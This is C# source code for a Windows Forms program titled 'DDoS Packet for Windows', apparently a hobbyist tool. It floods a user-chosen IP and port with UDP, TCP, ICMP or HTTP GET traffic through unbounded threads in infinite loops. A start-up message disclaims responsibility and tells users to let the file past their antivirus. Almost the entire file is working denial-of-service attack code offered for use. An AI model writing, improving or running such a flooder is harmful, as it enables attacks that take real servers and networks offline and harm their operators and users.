using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace DDoSPacket_For_Windows
{
    public partial class Form1 : Form
    {
        public int amount = 0;
        public int amountf = 0;

        public Form1()
        {
            InitializeComponent();
            Timer tmr = new Timer();
            tmr.Interval = 50;   // milliseconds
            tmr.Tick += update;  // set handler
            tmr.Start();
        }
        private void update(object sender, EventArgs e)  //run this logic each timer tick
        {
            this.label7.Text = "Packet sending are success: " + amount;
            this.label8.Text = "Packet sending are unsuccess: " + amountf;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("Welcome to DDoS Packet for Windows\nWarning: We are not responsible for any damage caused by this program please legally to use only!\nNotice:\n- This program maybe not working on windows 7\n- Most of Anti-Virus will blocked this file please allowed this file that safe. \n-ICMP Methods will send 1MB  you can't edit it\nVersion: 1.0", "Welcome", MessageBoxButtons.OK, MessageBoxIcon.Information);

        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("Error IP Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox2.Text == "")
            {
                MessageBox.Show("Error Port Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox3.Text == "")
            {
                MessageBox.Show("Error Thread box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox4.Text == "")
            {
                MessageBox.Show("Error Size Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (comboBox1.Text == "")
            {
                MessageBox.Show("Error Methods Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (comboBox1.Text == "UDP")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        udpattack();
                    }
                }).Start();
            }
               else if (comboBox1.Text == "TCP")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        tcpattack();
                    }
                }).Start();
            }
            else if (comboBox1.Text == "ICMP")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        icmpattack();
                    }
                }).Start();
            }
            else if (comboBox1.Text == "HTTP/GET (under dev)")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        HTTPGETATTACK();
                    }
                }).Start();
            }
        }
        public static String generateStringSize(long sizeByte)
        {

            StringBuilder sb = new StringBuilder();
            Random rd = new Random();

            var numOfChars = sizeByte;
            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            int maxIndex = allows.Length - 1;
            for (int i = 0; i < numOfChars; i++)
            {
                int index = rd.Next(maxIndex);
                char c = allows[index];
                sb.Append(c);
            }
            return sb.ToString();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public void udpattack()
        {
            
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
                ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(textBox1.Text);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(textBox2.Text));
            string data = generateStringSize(1024 * int.Parse(textBox4.Text));
            byte[] sus = Encoding.ASCII.GetBytes(data);
            sock.Connect(serverAddr, int.Parse(textBox2.Text));
                for (; ; )
                {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(sus, endPoint);
                        amount++;
                    }
                    catch
                    {
                        amountf++;
                    }
                }).Start();                    
                }
        }
        public void tcpattack()
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress serverAddr = IPAddress.Parse(textBox1.Text);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(textBox2.Text));
            string data = generateStringSize(1024 * int.Parse(textBox4.Text));
            byte[] sus = Encoding.ASCII.GetBytes(data);
            sock.Connect(serverAddr, int.Parse(textBox2.Text));
            for (; ; )
            {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(sus, endPoint);
                        amount++;
                    }
                    catch
                    {
                        amountf++;
                    }
                }).Start();
            }
        }
        public void icmpattack()
        {
            new Thread(() =>
            {
                Ping pingSender = new Ping();
                string data = generateStringSize(1024 * 1);
                byte[] sus = Encoding.ASCII.GetBytes(data);
                int timeout = 5000;
                PingOptions options = new PingOptions(64, true);
                for (; ; )
                {
                    new Thread(() =>
                    {
                        try
                        {
                            PingReply reply = pingSender.Send(textBox1.Text, timeout, sus, options);
                            amount++;
                        }
                        catch
                        {
                            amountf++;
                        }
                    }).Start();
                }
            }).Start();
            }
        public void HTTPGETATTACK()
        {
            var url = textBox1.Text;
            
            for (; ; )
            {
                new Thread(() =>
                {
                    WebRequest request = WebRequest.Create(textBox1.Text);
                    request.Method = "GET";
                    try
                    {
                        WebResponse response = request.GetResponse();
                        amount++;
                    }
                    catch
                    {
                        amountf++;
                    }
                }).Start();
            }
        }
        }
    }